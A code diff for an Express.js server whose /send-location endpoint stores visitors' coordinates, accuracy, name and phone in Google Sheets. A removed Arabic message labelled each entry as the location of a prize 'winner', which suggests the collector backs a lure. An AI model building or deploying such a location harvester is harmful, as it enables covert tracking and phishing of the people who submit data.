@@ -3,9 +3,20 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
 const path = require('path');
+const { google } = require('googleapis');
 
 const app = express();
-const port = 3001;
+const port = process.env.PORT || 3001;
+
+// إعداد Google Sheets API
+const auth = new google.auth.GoogleAuth({
+    keyFile: path.join(__dirname, '../credentials.json'), // مسار ملف بيانات الاعتماد
+    scopes: ['https://www.googleapis.com/auth/spreadsheets']
+});
+
+const sheets = google.sheets({ version: 'v4', auth });
+
+const SPREADSHEET_ID = process.env.SPREADSHEET_ID; // معرف Google Sheets
 
 app.use(cors());
 app.use(bodyParser.json());
@@ -17,34 +28,45 @@ app.get('/', (req, res) => {
 
 app.post('/send-location', async (req, res) => {
     try {
-        const { latitude, longitude, accuracy, timestamp } = req.body;
+        const { latitude, longitude, accuracy, timestamp, name, phone } = req.body;
 
         if (!latitude || !longitude) {
             return res.status(400).json({ 
-                error: 'يجب توفير إحداثيات الموقع' 
+                error: 'Location coordinates are required' 
             });
         }
 
-        const message = `
-📍 موقع جديد للرابح 499:
-🌎 الإحداثيات: ${latitude}, ${longitude}
-🎯 الدقة: ${accuracy || 'غير معروفة'} متر
-🔗 رابط الموقع: https://www.google.com/maps?q=${latitude},${longitude}
-⏰ الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}
-        `;
+        // التحقق من صحة قيمة timestamp
+        const validTimestamp = isNaN(new Date(timestamp)) ? new Date() : new Date(timestamp);
 
-        // تسجيل الموقع في وحدة التحكم
-        console.log('تم استلام موقع جديد:', message);
+        // تخزين البيانات في Google Sheets
+        const locationData = [
+            `Name: ${name || 'Not provided'}`,
+            `Phone: ${phone || 'Not provided'}`,
+            `Coordinates: ${latitude}, ${longitude}`,
+            `Accuracy: ${accuracy || 'Unknown'}`,
+            `Timestamp: ${validTimestamp.toLocaleString('en-US')}`
+        ];
 
+        await sheets.spreadsheets.values.append({
+            spreadsheetId: SPREADSHEET_ID,
+            range: 'Sheet1!A:A', // النطاق الذي سيتم إضافة البيانات إليه
+            valueInputOption: 'RAW',
+            resource: {
+                values: locationData.map(item => [item])
+            }
+        });
+
+        console.log('Data successfully stored in Google Sheets');
         res.json({ 
             success: true, 
-            message: 'تم استلام موقعك بنجاح' 
+            message: 'Location data successfully received' 
         });
 
     } catch (error) {
         console.error('Error:', error);
         res.status(500).json({ 
-            error: 'حدث خطأ في معالجة البيانات' 
+            error: 'An error occurred while processing the data' 
         });
     }
 });
@@ -55,5 +77,5 @@ app.get('/health', (req, res) => {
 });
 
 app.listen(port, () => {
-    console.log(`الخادم يعمل على البورت ${port}`);
+    console.log(`Server is running on port ${port}`);
 });
